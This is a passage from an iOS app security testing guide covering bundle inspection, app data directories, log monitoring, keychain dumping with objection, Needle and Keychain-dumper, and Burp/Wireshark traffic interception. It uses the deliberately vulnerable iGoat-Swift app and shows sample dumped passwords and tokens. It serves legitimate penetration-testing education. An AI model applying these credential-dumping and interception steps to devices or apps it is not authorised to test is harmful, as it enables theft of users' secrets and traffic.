device (\texttt{-U}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}ps}\NormalTok{ {-}Uai}
 \ExtensionTok{PID}\NormalTok{  Name                 Identifier}
\ExtensionTok{{-}{-}{-}{-}}\NormalTok{  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{6847}\NormalTok{  Calendar             com.apple.mobilecal}
\ExtensionTok{6815}\NormalTok{  Mail                 com.apple.mobilemail}
   \ExtensionTok{{-}}\NormalTok{  App Store            com.apple.AppStore}
   \ExtensionTok{{-}}\NormalTok{  Apple Store          com.apple.store.Jolly}
   \ExtensionTok{{-}}\NormalTok{  Calculator           com.apple.calculator}
   \ExtensionTok{{-}}\NormalTok{  Camera               com.apple.camera}
   \ExtensionTok{{-}}\NormalTok{  iGoat{-}Swift          OWASP.iGoat{-}Swift}
\end{Highlighting}
\end{Shaded}

It also shows which of them are currently running. Take a note of the
``Identifier'' (bundle identifier) and the PID if any as you'll need
them afterwards.

You can also directly open passionfruit and after selecting your iOS
device you'll get the list of installed apps.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/10a4f9e98e7c4b14b4396229660b6b6c0fe7f30d.png}
\caption{Passionfruit Installed Apps}
\end{figure}

\hypertarget{exploring-the-app-package-1}{%
\subparagraph{Exploring the App
Package}\label{exploring-the-app-package-1}}

Once you have collected the package name of the application you want to
target, you'll want to start gathering information about it. First,
retrieve the IPA as explained in
\protect\hyperlink{obtaining-and-extracting-apps}{Basic Testing
Operations - Obtaining and Extracting Apps}.

You can unzip the IPA using the standard \texttt{unzip} or any other ZIP
utility. Inside you'll find a \texttt{Payload} folder contaning the
so-called Application Bundle (.app). The following is an example in the
following output, note that it was truncated for better readability and
overview:

\begin{verbatim}
$ ls -1 Payload/iGoat-Swift.app
rutger.html
mansi.html
splash.html
about.html

LICENSE.txt
Sentinel.txt
README.txt

URLSchemeAttackExerciseVC.nib
CutAndPasteExerciseVC.nib
RandomKeyGenerationExerciseVC.nib
KeychainExerciseVC.nib
CoreData.momd
archived-expanded-entitlements.xcent
SVProgressHUD.bundle

Base.lproj
Assets.car
PkgInfo
_CodeSignature
AppIcon60x60@3x.png

Frameworks

embedded.mobileprovision

Credentials.plist
Assets.plist
Info.plist

iGoat-Swift
\end{verbatim}

The most relevant items are:

\begin{itemize}
\tightlist
\item
  \texttt{Info.plist} contains configuration information for the
  application, such as its bundle ID, version number, and display name.
\item
  \texttt{\_CodeSignature/} contains a plist file with a signature over
  all files in the bundle.
\item
  \texttt{Frameworks/} contains the app native libraries as .dylib or
  .framework files.
\item
  \texttt{PlugIns/} may contain app extensions as .appex files (not
  present in the example).
\item
  \texttt{iGoat-Swift} is the app binary containing the app's code. Its
  name is the same as the bundle's name minus the .app extension.
\item
  Various resources such as images/icons, \texttt{*.nib} files (storing
  the user interfaces of iOS app), localized content
  (\texttt{\textless{}language\textgreater{}.lproj}), text files, audio
  files, etc.
\end{itemize}

The Info.plist File

The information property list or \texttt{Info.plist} (named by
convention) is the main source of information for an iOS app. It
consists of a structured file containing key-value pairs describing
essential configuration information about the app. Actually, all bundled
executables (app extensions, frameworks and apps) are expected to have
an \texttt{Info.plist} file. You can find all possible keys in the
\href{https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc}{Apple
Developer Documentation}.

The file might be formatted in XML or binary (bplist). You can convert
it to XML format with one simple command:

\begin{itemize}
\item
  On macOS with \texttt{plutil}, which is a tool that comes natively
  with macOS 10.2 and above versions (no official online documentation
  is currently available):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{plutil}\NormalTok{ {-}convert xml1 Info.plist}
\end{Highlighting}
\end{Shaded}
\item
  On Linux:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{apt}\NormalTok{ install libplist{-}utils}
\NormalTok{$ }\ExtensionTok{plistutil}\NormalTok{ {-}i Info.plist {-}o Info\_xml.plist}
\end{Highlighting}
\end{Shaded}
\end{itemize}

Here's a non-exhaustive list of some info and the corresponding keywords
that you can easily search for in the \texttt{Info.plist} file by just
inspecting the file or by using
\texttt{grep\ -i\ \textless{}keyword\textgreater{}\ Info.plist}:

\begin{itemize}
\tightlist
\item
  App permissions Purpose Strings: \texttt{UsageDescription} (see
  ``\href{0x06h-Testing-Platform-Interaction.md}{iOS Platform APIs}'')
\item
  Custom URL schemes: \texttt{CFBundleURLTypes} (see
  ``\href{0x06h-Testing-Platform-Interaction.md}{iOS Platform APIs}'')
\item
  Exported/imported \emph{custom document types}:
  \texttt{UTExportedTypeDeclarations}/\texttt{UTImportedTypeDeclarations}
  (see ``\href{0x06h-Testing-Platform-Interaction.md}{iOS Platform
  APIs}'')
\item
  App Transport Security (ATS) configuration:
  \texttt{NSAppTransportSecurity} (see
  ``\href{0x06g-Testing-Network-Communication.md}{iOS Network APIs}'')
\end{itemize}

Please refer to the mentioned chapters to learn more about how to test
each of these points.

App Binary

iOS app binaries are fat binaries (they can be deployed on all devices
32- and 64-bit). In contrast to Android, where you can actually
decompile the app binary to Java code, the iOS app binaries can only be
disassembled.

Refer to the chapter
\href{0x06c-Reverse-Engineering-and-Tampering.md}{Tampering and Reverse
Engineering on iOS} for more details.

Native Libraries

iOS native libraries are known as Frameworks.

You can easily visualize them from Passionfruit by clicking on
``Modules'':

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/67df79153b351160650e3671f95ec4d358cdb42e.png}
\caption{Passionfruit Modules}
\end{figure}

And get a more detailed view including their imports/exports:

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/66f4454a50ab09521142216735c12da384b6ebe1.png}
\caption{Passionfruit Modules Detail}
\end{figure}

They are available in the \texttt{Frameworks} folder in the IPA, you can
also inspect them from the terminal:

\begin{verbatim}
$ ls -1 Frameworks/
Realm.framework
libswiftCore.dylib
libswiftCoreData.dylib
libswiftCoreFoundation.dylib
\end{verbatim}

or from the device with objection (as well as per SSH of course):

\begin{verbatim}
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  ----------------------------
Directory         493  None                ...  Realm.framework
Regular           420  None                ...  libswiftCore.dylib
Regular           420  None                ...  libswiftCoreData.dylib
Regular           420  None                ...  libswiftCoreFoundation.dylib
...
\end{verbatim}

Please note that this might not be the complete list of native code
elements being used by the app as some can be part of the source code,
meaning that they'll be compiled in the app binary and therefore cannot
be found as standalone libraries or Frameworks in the
\texttt{Frameworks} folder.

For now this is all information you can get about the Frameworks unless
you start reverse engineering them. Refer to the chapter
\href{0x06c-Reverse-Engineering-and-Tampering.md}{Tampering and Reverse
Engineering on iOS} for more information about how to reverse engineer
Frameworks.

Other App Resources

It is normally worth taking a look at the rest of the resources and
files that you may find in the Application Bundle (.app) inside the IPA
as some times they contain additional goodies like encrypted databases,
certificates, etc.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/24668459a85228c7fd3205ac60e616120c5fa265.png}
\caption{Passionfruit Database View}
\end{figure}

\hypertarget{accessing-app-data-directories-1}{%
\subparagraph{Accessing App Data
Directories}\label{accessing-app-data-directories-1}}

Once you have installed the app, there is further information to
explore. Let's go through a short overview of the app folder structure
on iOS apps to understand which data is stored where. The following
illustration represents the application folder structure:

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/5a8b4b5da9d5f0e362687fe04a7d34d52f468738.png}
\caption{iOS App Folder Structure}
\end{figure}

On iOS, system applications can be found in the \texttt{/Applications}
directory while user-installed apps are available under
\texttt{/private/var/containers/}. However, finding the right folder
just by navigating the file system is not a trivial task as every app
gets a random 128-bit UUID (Universal Unique Identifier) assigned for
its directory names.

In order to easily obtain the installation directory information for
user-installed apps you can follow the following methods:

Connect to the terminal on the device and run the command
\texttt{ipainstaller}
(\href{https://cydia.saurik.com/package/com.autopear.installipa}{IPA
Installer Console}) as follows:

\begin{verbatim}
iPhone:~ root# ipainstaller -l
...
OWASP.iGoat-Swift

iPhone:~ root# ipainstaller -i OWASP.iGoat-Swift
...
Bundle: /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67
Application: /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
Data: /private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693
\end{verbatim}

Using objection's command \texttt{env} will also show you all the
directory information of the app. Connecting to the application with
objection is described in the section
``\protect\hyperlink{using-objection}{Recommended Tools - Objection}''.

\begin{verbatim}
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
\end{verbatim}

As you can see, apps have two main locations:

\begin{itemize}
\tightlist
\item
  The Bundle directory
  (\texttt{/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/}).
\item
  The Data directory
  (\texttt{/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/}).
\end{itemize}

These folders contain information that must be examined closely during
application security assessments (for example when analyzing the stored
data for sensitive data).

Bundle directory:

\begin{itemize}
\tightlist
\item
  \textbf{AppName.app}

  \begin{itemize}
  \tightlist
  \item
    This is the Application Bundle as seen before in the IPA, it
    contains essential application data, static content as well as the
    application's compiled binary.
  \item
    This directory is visible to users, but users can't write to it.
  \item
    Content in this directory is not backed up.
  \item
    The contents of this folder are used to validate the code signature.
  \end{itemize}
\end{itemize}

Data directory:

\begin{itemize}
\tightlist
\item
  \textbf{Documents/}

  \begin{itemize}
  \tightlist
  \item
    Contains all the user-generated data. The application end user
    initiates the creation of this data.
  \item
    Visible to users and users can write to it.
  \item
    Content in this directory is backed up.
  \item
    The app can disable paths by setting
    \texttt{NSURLIsExcludedFromBackupKey}.
  \end{itemize}
\item
  \textbf{Library/}

  \begin{itemize}
  \tightlist
  \item
    Contains all files that aren't user-specific, such as caches,
    preferences, cookies, and property list (plist) configuration files.
  \item
    iOS apps usually use the \texttt{Application\ Support} and
    \texttt{Caches} subdirectories, but the app can create custom
    subdirectories.
  \end{itemize}
\item
  \textbf{Library/Caches/}

  \begin{itemize}
  \tightlist
  \item
    Contains semi-persistent cached files.
  \item
    Invisible to users and users can't write to it.
  \item
    Content in this directory is not backed up.
  \item
    The OS may delete this directory's files automatically when the app
    is not running and storage space is running low.
  \end{itemize}
\item
  \textbf{Library/Application Support/}

  \begin{itemize}
  \tightlist
  \item
    Contains persistent files necessary for running the app.
  \item
    Invisible to users and users can't write to it.
  \item
    Content in this directory is backed up.
  \item
    The app can disable paths by setting
    \texttt{NSURLIsExcludedFromBackupKey}.
  \end{itemize}
\item
  \textbf{Library/Preferences/}

  \begin{itemize}
  \tightlist
  \item
    Used for storing properties that can persist even after an
    application is restarted.
  \item
    Information is saved, unencrypted, inside the application sandbox in
    a plist file called {[}BUNDLE\_ID{]}.plist.
  \item
    All the key/value pairs stored using \texttt{NSUserDefaults} can be
    found in this file.
  \end{itemize}
\item
  \textbf{tmp/}

  \begin{itemize}
  \tightlist
  \item
    Use this directory to write temporary files that do not need to
    persist between app launches.
  \item
    Contains non-persistent cached files.
  \item
    Invisible to users.
  \item
    Content in this directory is not backed up.
  \item
    The OS may delete this directory's files automatically when the app
    is not running and storage space is running low.
  \end{itemize}
\end{itemize}

Let's take a closer look at iGoat-Swift's Application Bundle (.app)
directory inside the Bundle directory
(\texttt{/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app}):

\begin{verbatim}
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt

Directory         493  None                ...  URLSchemeAttackExerciseVC.nib
Directory         493  None                ...  CutAndPasteExerciseVC.nib
Directory         493  None                ...  RandomKeyGenerationExerciseVC.nib
Directory         493  None                ...  KeychainExerciseVC.nib
Directory         493  None                ...  CoreData.momd
Regular           420  None                ...  archived-expanded-entitlements.xcent
Directory         493  None                ...  SVProgressHUD.bundle

Directory         493  None                ...  Base.lproj
Regular           420  None                ...  Assets.car
Regular           420  None                ...  PkgInfo
Directory         493  None                ...  _CodeSignature
Regular           420  None                ...  AppIcon60x60@3x.png

Directory         493  None                ...  Frameworks

Regular           420  None                ...  embedded.mobileprovision

Regular           420  None                ...  Credentials.plist
Regular           420  None                ...  Assets.plist
Regular           420  None                ...  Info.plist

Regular           493  None                ...  iGoat-Swift
\end{verbatim}

You can also visualize the Bundle directory from Passionfruit by
clicking on \textbf{Files} -\textgreater{} \textbf{App Bundle}:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/64430942f835261b3d5dda4b1a015f93a37444a5.png}
\caption{Passionfruit Bundle Directory View}
\end{figure}

Including the \texttt{Info.plist} file:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/527c1334c8624ced36aea25f510ec6b9d3af0927.png}
\caption{Passionfruit Plist View}
\end{figure}

As well as the Data directory in \textbf{Files} -\textgreater{}
\textbf{Data}:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.png}
\caption{Passionfruit Data Directory View}
\end{figure}

Refer to the \href{0x06d-Testing-Data-Storage.md}{Testing Data Storage}
chapter for more information and best practices on securely storing
sensitive data.

\hypertarget{monitoring-system-logs-1}{%
\subparagraph{Monitoring System Logs}\label{monitoring-system-logs-1}}

Many apps log informative (and potentially sensitive) messages to the
console log. The log also contains crash reports and other useful
information. You can collect console logs through the Xcode
\textbf{Devices} window as follows:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Launch Xcode.
\item
  Connect your device to your host computer.
\item
  Choose \textbf{Window} -\textgreater{} \textbf{Devices and
  Simulators}.
\item
  Click on your connected iOS device in the left section of the Devices
  window.
\item
  Reproduce the problem.
\item
  Click on the \textbf{Open Console} button located in the upper
  right-hand area of the Devices window to view the console logs on a
  separate window.
\end{enumerate}

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/277e652a44a38783e21eb7c8b9f08bc1ec9ea888.png}
\caption{Images/Chapters/0x06b/open\_device\_console.png}
\end{figure}

To save the console output to a text file, go to the top right side of
the Console window and click on the \textbf{Save} button.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/80296790f84b6f892c5600d3679bf94df59a5303.png}
\caption{Images/Chapters/0x06b/device\_console.png}
\end{figure}

You can also connect to the device shell as explained in
\href{0x06b-Basic-Security-Testing.md\#accessing-the-device-shell}{Accessing
the Device Shell}, install socat via apt-get and run the following
command:

\begin{verbatim}
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
\end{verbatim}

Additionally, Passionfruit offers a view of all the NSLog-based
application logs. Simply click on the \textbf{Console} -\textgreater{}
\textbf{Output} tab:

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/962e8ecc0cf25f4714db0758530228fcd0c6d54e.png}
\caption{Passionfruit Console Logs View}
\end{figure}

Needle also has an option to capture the logs of an iOS application, you
can start the monitoring by opening Needle and running the following
commands:

\begin{verbatim}
[needle] > use dynamic/monitor/syslog
[needle][syslog] > run
\end{verbatim}

\hypertarget{dumping-keychain-data}{%
\subparagraph{Dumping KeyChain Data}\label{dumping-keychain-data}}

Dumping the KeyChain data can be done with multiple tools, but not all
of them will work on any iOS version. As is more often the case, try the
different tools or look up their documentation for information on the
latest supported versions.

Objection (Jailbroken / non-Jailbroken)

The KeyChain data can easily be viewed using Objection. First, connect
objection to the app as described in ``Recommended Tools - Objection''.
Then, use the \texttt{ios\ keychain\ dump} command to get an overview of
the keychain:

\begin{verbatim}
$ objection --gadget="iGoat-Swift" explore
... [usb] # ios keychain dump
...
Note: You may be asked to authenticate using the devices passcode or TouchID
Save the output by adding `--json keychain.json` to this command
Dumping the iOS keychain...
Created                    Accessible                      ACL    Type      Account              Service                     Data
-------------------------  ------------------------------  -----  --------  -------------------  --------------------------  ----------------------------------------------------------------------
2019-06-06 10:53:09 +0000  WhenUnlocked                    None   Password  keychainValue        com.highaltitudehacks.dvia  mypassword123
2019-06-06 10:53:30 +0000  WhenUnlockedThisDeviceOnly      None   Password  SCAPILazyVector      com.toyopagroup.picaboo     (failed to decode)
2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  fideliusDeviceGraph  com.toyopagroup.picaboo     (failed to decode)
2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  SCDeviceTokenKey2    com.toyopagroup.picaboo     00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh
2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  SCDeviceTokenValue2  com.toyopagroup.picaboo     CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=
OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # quit  
\end{verbatim}

Note that currently, the latest versions of frida-server and objection
do not correctly decode all keychain data. Different combinations can be
tried to increase compatibility. For example, the previous printout was
created with \texttt{frida-tools==1.3.0}, \texttt{frida==12.4.8} and
\texttt{objection==1.5.0}.

Finally, since the keychain dumper is executed from within the
application context, it will only print out keychain items that can be
accessed by the application and \textbf{not} the entire keychain of the
iOS device.

Needle (Jailbroken)

Needle can list the content of the keychain through the
\texttt{storage/data/keychain\_dump\_frida} module. However, getting
Needle up and running can be difficult. First, make sure that
\texttt{open}, and the \texttt{darwin\ cc\ tools} are installed. The
installation procedure for these tools is described in ``Recommended
Tools - iOS Device''.

Before dumping the keychain, open Needle and use the
\texttt{device/dependency\_installer} plugin to install any other
missing dependencies. This module should return without any errors. If
an error did pop up, be sure to fix this error before continuing.

Finally, select the \texttt{storage/data/keychain\_dump\_frida} module
and run it:

\begin{verbatim}
[needle][keychain_dump_frida] > use storage/data/keychain_dump_frida
[needle][keychain_dump_frida] > run
[*] Checking connection with device...
[+] Already connected to: 192.168.43.91
[+] Target app: OWASP.iGoat-Swift
[*] Retrieving app's metadata...
[*] Pulling: /private/var/containers/Bundle/Application/92E7C59C-2F0B-47C5-94B7-DCF506DBEB34/iGoat-Swift.app/Info.plist -> /Users/razr/.needle/tmp/plist
[*] Setting up local port forwarding to enable communications with the Frida server...
[*] Launching the app...
[*] Attaching to process: 4448
[*] Parsing payload
[*] Keychain Items:
[+] {
    "AccessControls": "",
    "Account": "keychainValue",
    "CreationTime": "2019-06-06 10:53:09 +0000",
    "Data": " (UTF8 String: 'mypassword123')",
    "EntitlementGroup": "C9MEM643RA.org.dummy.fastlane.FastlaneTest",
    "ModifiedTime": "2019-06-06 16:53:38 +0000",
    "Protection": "kSecAttrAccessibleWhenUnlocked",
    "Service": "com.highaltitudehacks.dvia",
    "kSecClass": "kSecClassGenericPassword"
}
...
[+] {
    "AccessControls": "",
    "Account": "<53434465 76696365 546f6b65 6e56616c 756532>",
    "CreationTime": "2019-06-06 10:53:30 +0000",
    "Data": " (UTF8 String: 'CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=')",
    "EntitlementGroup": "C9MEM643RA.org.dummy.fastlane.FastlaneTest",
    "ModifiedTime": "2019-06-06 10:53:30 +0000",
    "Protection": "kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly",
    "Service": "com.toyopagroup.picaboo",
    "kSecClass": "kSecClassGenericPassword"
}
[*] Saving output to file: /Users/razr/.needle/output/frida_script_dump_keychain.txt
\end{verbatim}

Note that currently only the \texttt{keychain\_dump\_frida} module works
on iOS 12, but not the \texttt{keychain\_dump} module.

Passionfruit (Jailbroken / non-Jailbroken)

With Passionfruit it's possible to access the keychain data of the app
you have selected. Click on \textbf{Storage} -\textgreater{}
\textbf{Keychain} and you can see a listing of the stored Keychain
information.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/0a5a8632266244b98216ae2ffb8a6a773b9dbb6d.png}
\caption{Passionfruit Keychain}
\end{figure}

Keychain-dumper (Jailbroken)

\href{https://github.com/ptoomey3/Keychain-Dumper/}{Keychain-dumper}
lets you dump a jailbroken device's KeyChain contents. The easiest way
to get the tool is to download the binary from its GitHub repo:

\begin{verbatim}
$ git clone https://github.com/ptoomey3/Keychain-Dumper
$ scp -P 2222 Keychain-Dumper/keychain_dumper root@localhost:/tmp/
$ ssh -p 2222 root@localhost
iPhone:~ root# chmod +x /tmp/keychain_dumper
iPhone:~ root# /tmp/keychain_dumper

(...)

Generic Password
----------------
Service: myApp
Account: key3
Entitlement Group: RUD9L355Y.sg.vantagepoint.example
Label: (null)
Generic Field: (null)
Keychain Data: SmJSWxEs

Generic Password
----------------
Service: myApp
Account: key7
Entitlement Group: RUD9L355Y.sg.vantagepoint.example
Label: (null)
Generic Field: (null)
Keychain Data: WOg1DfuH
\end{verbatim}

In newer versions of iOS (iOS 11 and up), additional steps are
necessary. See the README.md for more details. Note that this binary is
signed with a self-signed certificate that has a ``wildcard''
entitlement. The entitlement grants access to \emph{all} items in the
Keychain. If you are paranoid or have very sensitive private data on
your test device, you may want to build the tool from source and
manually sign the appropriate entitlements into your build; instructions
for doing this are available in the GitHub repository.

\hypertarget{setting-up-a-network-testing-environment-1}{%
\subsubsection{Setting Up a Network Testing
Environment}\label{setting-up-a-network-testing-environment-1}}

\hypertarget{basic-network-monitoringsniffing-1}{%
\paragraph{Basic Network
Monitoring/Sniffing}\label{basic-network-monitoringsniffing-1}}

You can remotely sniff all traffic in real-time on iOS by
\href{https://stackoverflow.com/questions/9555403/capturing-mobile-phone-traffic-on-wireshark/33175819\#33175819}{creating
a Remote Virtual Interface} for your iOS device. First make sure you
have Wireshark installed on your macOS machine.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Connect your iOS device to your macOS machine via USB.
\item
  You would need to know the UDID of your iOS device, before you can
  start sniffing. Check the section ``Getting the UDID of an iOS
  device'' on how to retrieve it. Open the Terminal on macOS and enter
  the following command, filling in the UDID of your iOS device.
\end{enumerate}

\begin{verbatim}
$ rvictl -s <UDID>
Starting device <UDID> [SUCCEEDED] with interface rvi0
\end{verbatim}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Launch Wireshark and select ``rvi0'' as the capture interface.
\item
  Filter the traffic with Capture Filters in Wireshark to display what
  you want to monitor (for example, all HTTP traffic sent/received via
  the IP address 192.168.1.1).
\end{enumerate}

\begin{verbatim}
ip.addr == 192.168.1.1 && http
\end{verbatim}

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/1ddd41202821c8a781630622193411ffb54d0ff1.png}
\caption{Images/Chapters/0x06b/wireshark\_filters.png}
\end{figure}

The documentation of Wireshark offers many examples for
\href{https://wiki.wireshark.org/CaptureFilters}{Capture Filters} that
should help you to filter the traffic to get the information you want.

\hypertarget{setting-up-an-interception-proxy-1}{%
\paragraph{Setting up an Interception
Proxy}\label{setting-up-an-interception-proxy-1}}

Burp Suite is an integrated platform for security testing mobile and web
applications. Its tools work together seamlessly to support the entire
testing process, from initial mapping and analysis of attack surfaces to
finding and exploiting security vulnerabilities. Burp Proxy operates as
a web proxy server for Burp Suite, which is positioned as a
man-in-the-middle between the browser and web server(s). Burp Suite
allows you to intercept, inspect, and modify incoming and outgoing raw
HTTP traffic.

Setting up Burp to proxy your traffic is pretty straightforward. We
assume that you have an iOS device and workstation connected to a Wi-Fi
network that permits client-to-client traffic. If client-to-client
traffic is not permitted, you can use usbmuxd to connect to Burp via
USB.

PortSwigger provides a good
\href{https://support.portswigger.net/customer/portal/articles/1841108-configuring-an-ios-device-to-work-with-burp}{tutorial
on setting up an iOS device to work with Burp} and a
\href{https://support.portswigger.net/customer/portal/articles/1841109-installing-burp-s-ca-certificate-in-an-ios-device}{tutorial
on installing Burp's CA certificate to an iOS device}.

\hypertarget{using-burp-via-usb-on-a-jailbroken-device}{%
\subparagraph{Using Burp via USB on a Jailbroken
Device}\label{using-burp-via-usb-on-a-jailbroken-device}}

In the section
\href{0x06b-Basic-Security-Testing.md\#accessing-the-device-shell}{Accessing
the Device Shell} we've already learned how we can use iproxy to use SSH
via USB. When doing dynamic analysis, it's interesting to use the SSH
connection to route our traffic to Burp that is running on our computer.
Let's get started:

First we need to use iproxy to make SSH from iOS available on localhost.

\begin{verbatim}
$ iproxy 2222 22
waiting for connection
\end{verbatim}

The next step is to make a remote port forwarding of port 8080 on the
iOS device to the localhost interface on our computer to port 8080.

\begin{verbatim}
ssh -R 8080:localhost:8080 root@localhost -p 2222
\end{verbatim}

You should now be able to reach Burp on your iOS device. Open Safari on
iOS and go to 127.0.0.1:8080 and you should see the Burp Suite Page.
This would also be a good time to
\href{https://support.portswigger.net/customer/portal/articles/1841109-installing-burp-s-ca-certificate-in-an-ios-device}{install
the CA certificate} of Burp on your iOS device.

The last step would be to set the proxy globally on your iOS device:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Go to \textbf{Settings} -\textgreater{} \textbf{Wi-Fi}
\item
  Connect to \emph{any} Wi-Fi (you can literally connect to any Wi-Fi as
  the traffic for port 80 and 443 will be routed through USB, as we are
  just using the Proxy Setting for the Wi-Fi so we can set a global
  Proxy)
\item
  Once connected click on the small blue icon on the right side of the
  connect Wi-Fi
\item
  Configure your Proxy by selecting \textbf{Manual}
\item
  Type in 127.0.0.1 as \textbf{Server}
\item
  Type in 8080 as \textbf{Port}
\end{enumerate}

Open Safari and go to any webpage, you should see now the traffic in
Burp. Thanks @hweisheimer for the
\href{https://twitter.com/hweisheimer/status/1095383526885724161}{initial
idea}!

\hypertarget{certificate-pinning-1}{%
\paragraph{Certificate Pinning}\label{certificate-pinning-1}}

Some applications will implement SSL Pinning, which prevents the
application from accepting your intercepting certificate as a valid
certificate. This means that you will not be able to monitor the traffic
between the application and the server.

For information on disabling SSL Pinning both statically and
dynamically, refer to ``Bypassing SSL Pinning'' in the ``Testing Network
Communication'' chapter.

\hypertarget{references-16}{%
\subsubsection{References}\label{references-16}}

\begin{itemize}
\tightlist
\item
  Jailbreak Exploits -
  \url{https://www.theiphonewiki.com/wiki/Jailbreak_Exploits}
\item
  limera1n exploit - \url{https://www.theiphonewiki.com/wiki/Limera1n}
\item
  IPSW Downloads website - \url{https://ipsw.me}
\item
  Can I Jailbreak? - \url{https://canijailbreak.com/}
\item
  The iPhone Wiki - \url{https://www.theiphonewiki.com/}
\item
  Redmond Pie - \url{https://www.redmondpie.com/}
\item
  Reddit Jailbreak - \url{https://www.reddit.com/r/jailbreak/}
\item
  Information Property List -
  \url{https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc}
\item
  UIDeviceFamily -
  \url{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html\#//apple_ref/doc/uid/TP40009252-SW11}
\end{itemize}

\hypertarget{tools-9}{%
\paragraph{Tools}\label{tools-9}}

\begin{itemize}
\tightlist
\item
  Apple iOS SDK - \url{https://developer.apple.com/download/more/}
\item
  AppSync - \url{http://repo.hackyouriphone.org/appsyncunified}
\item
  Burp Suite - \url{https://portswigger.net/burp/communitydownload}
\item
  Chimera - \url{https://chimera.sh/}
\item
  class-dump -
  \url{https://github.com/interference-security/ios-pentest-tools/blob/master/class-dump}
\item
  class-dump-z -
  \url{https://github.com/interference-security/ios-pentest-tools/blob/master/class-dump-z}
\item
  Clutch - \url{https://github.com/KJCracks/Clutch}
\item
